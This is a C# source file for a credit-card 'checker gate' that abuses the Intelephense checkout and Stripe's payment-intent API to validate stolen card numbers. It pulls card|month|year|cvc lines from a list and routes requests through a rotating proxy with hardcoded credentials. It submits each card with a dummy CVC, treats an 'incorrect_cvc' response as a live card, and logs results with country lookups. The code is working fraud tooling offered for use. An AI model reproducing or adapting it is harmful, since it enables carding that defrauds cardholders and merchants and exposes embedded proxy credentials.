using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using gateBeta;
using gateBeta.gates;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using RestSharp;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Intelephense
    {
        check check = new check();
        Socks socks = new Socks();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        string error = "";
        string ipUp = "";
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }
         

        public void load()
        {
           
            if (Thunder._Form1.numcc() > 0 && Variables.run)
            {
                //var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();
                pago();
            }

        }


        private void pago()
        {
            try
            {
                Thunder._Form1.update_progresbar(5);

             


                if (Thunder._Form1.numcc() > 0 && Variables.run)
                {

                    Thunder._Form1.update_progresbar(5);
                    string jsonString = "";
                    var client = new RestClient("https://intelephense.com/payment-intent");
                    client.Timeout = -1;
                    client.Proxy = new WebProxy("p.webshare.io:80");
                    client.Proxy.Credentials =
                      new NetworkCredential("wfdmoeej-rotate", "acog59a0zt9t");
                    var request = new RestRequest(Method.POST);
                    request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                    request.AddParameter("currencyCode", "USD");
                    request.AddParameter("countryCode", "EC");
                    request.AddParameter("regionCode", "");
                    request.AddParameter("quantity", "1");
                    request.AddParameter("email",correo);
                    request.AddParameter("name", "JOSE REYES");
                    request.AddParameter("companyName", "jose");
                    IRestResponse response = client.Execute(request);

                    if (response.Content == "")
                    {
                       
                        Console.WriteLine(response.ErrorMessage.ToString());
                        pago();
                    }
                    else
                    {
                        
                        dynamic resp = JsonConvert.DeserializeObject(response.Content);

                        if (resp.code == "200" && resp.secret!="")
                        {
                            

                            for(var i = 0; i <= 1; i++)
                            {

                                string cc = Thunder._Form1.nextCc();
                                string[] ccLine = cc.Split('|');
                                var ccnum = ccLine[0];
                                var ccmes = ccLine[1];
                                var ccanio = ccLine[2].Remove(0, 2);
                                var CCV = ccLine[3];

                                var CCccv = "000";

                                if (CCV.Trim().Length == 4)
                                {
                                    CCccv = "0000";

                                }

                                Thunder._Form1.update_progresbar(90);
                                var a = resp.secret;
                                string b = resp.secret;
                                string[] pi = b.Split('_');
                                var pirest = pi[0] + "_" + pi[1];
                                Console.WriteLine(pirest);
                                var client2 = new RestClient("https://api.stripe.com/v1/payment_intents/" + pirest + "/confirm");
                                client2.Timeout = -1;
                                client2.Proxy = new WebProxy("p.webshare.io:80");
                                client.Proxy.Credentials =
                                  new NetworkCredential("wfdmoeej-rotate", "acog59a0zt9t");
                                var request2 = new RestRequest(Method.POST);
                                request2.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                                request2.AddParameter("receipt_email", correo);
                                request2.AddParameter("payment_method_data[type]", "card");
                                request2.AddParameter("payment_method_data[billing_details][name]", "JOSE REYES");
                                request2.AddParameter("payment_method_data[card][number]", ccnum);
                                request2.AddParameter("payment_method_data[card][cvc]", CCccv);
                                request2.AddParameter("payment_method_data[card][exp_month]", ccmes);
                                request2.AddParameter("payment_method_data[card][exp_year]", ccanio);
                                request2.AddParameter("payment_method_data[guid]", "9cdb82bf-6792-41cc-a16b-90882c7431ba5c1eec");
                                request2.AddParameter("payment_method_data[muid]", "1a9a2a28-aacc-4fcd-bf17-8cb3faac5da3775277");
                                request2.AddParameter("payment_method_data[sid]", "422c53cf-7135-4c11-a2ae-639b611212b1565f36");
                                //request2.AddParameter("payment_method_data[pasted_fields]", "number");
                                request2.AddParameter("payment_method_data[payment_user_agent]", "stripe.js/b5fc776e8; stripe-js-v3/b5fc776e8");
                                request2.AddParameter("payment_method_data[time_on_page]", "44221");
                                request2.AddParameter("payment_method_data[referrer]", "https://intelephense.com/");
                                request2.AddParameter("expected_payment_method_type", "card");
                                request2.AddParameter("use_stripe_sdk", "true");
                                request2.AddParameter("webauthn_uvpa_available", "false");
                                request2.AddParameter("spc_eligible", "false");
                                request2.AddParameter("key", "pk_live_6U93nvAmMOJ2jBI2GPIwE2Qk00BToqeDYE");
                                request2.AddParameter("client_secret", resp.secret);
                                IRestResponse response2 = client2.Execute(request2);
                                Console.WriteLine(response2.Content);
                                if (response2.Content == "")
                                {
                                  
                                    Console.WriteLine(response2.ErrorMessage.ToString());
                                    pago();
                                }
                                else
                                {
                                    dynamic resp2 = JsonConvert.DeserializeObject(response2.Content);

                                    Console.WriteLine(resp2);
                                    Thread.Sleep(1000);
                                    //Console.WriteLine(resp2.error.decline_code);
                                    Thread.Sleep(1000);

                                    if (resp2.error.code != "")
                                    {
                                        //string resulPago = resp2.error.code;
                                        if (resp2.error.code == "incorrect_cvc")
                                        {
                                            Thunder._Form1.update_progresbar(100);
                                            var pais = checkbin(cc.Substring(0, 6));
                                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                                            check.ccss(Variables.key, guardar, "lives");
                                            Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
                                            check.playlive();
                                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                                            Thunder._Form1.remove_cc(0, cc.Length);
                                            numeroTargeta++;
                                            pagos++;
                                            Thread.Sleep(5000);
                                            if (i == 1)
                                            {
                                                pago();
                                            }
                                        }
                                        else
                                        {

                                            if (resp2.error.decline_code == "fraudulent")
                                            {
                                                Thunder._Form1.update_progresbar(100);
                                                var  pais1 = checkbin(cc.Substring(0, 6));
                                                Thunder._Form1.update_progresbar(100);
                                               var  guardar2 = numeroTargeta + " - " + cc + " - " + pais1 + " " + Variables.gate;
                                                check.ccss(Variables.key, guardar2, "deads");
                                                Thread.Sleep(300);
                                                Thunder._Form1.agragar_dead(cc);
                                                Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                                                Thunder._Form1.remove_cc(0, cc.Length);
                                                numeroTargeta++;
                                                pagos++;
                                                Thread.Sleep(5000);
                                                pago();
                                                return;
                                            }

                                            Thunder._Form1.update_progresbar(100);
                                            var pais = checkbin(cc.Substring(0, 6));
                                            Thunder._Form1.update_progresbar(100);
                                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                                            check.ccss(Variables.key, guardar, "deads");
                                            Thread.Sleep(300);
                                            Thunder._Form1.agragar_dead(cc);
                                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                                            Thunder._Form1.remove_cc(0, cc.Length);
                                            numeroTargeta++;
                                            pagos++;
                                            Thread.Sleep(5000);
                                            if (i == 1)
                                            {
                                                pago();
                                            }
                                           
                                        }
                                    }
                                    else
                                    {
                                        Thunder._Form1.update_progresbar(100);
                                        var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                                        check.ccss(Variables.key, guardar, "deads");
                                        Thread.Sleep(300);
                                        Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                                        Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                                        Form1.textBox2.AppendText(Environment.NewLine);
                                        Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                                        numeroTargeta++;
                                        pagos++;
                                        Thread.Sleep(5000);
                                        if (i == 1)
                                        {
                                            pago();
                                        }
                                    }

                                }
                            }

                            
                        }
                    }

                }
                else
                {
                    return;
                }
            }
            catch (Exception ex)
            {
                if (Variables.run == true)
                {
                    load();
                }
                else
                {
                    return;
                }

               
            }

        }

        public void stop()
        {
            return;
        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }
    }
}
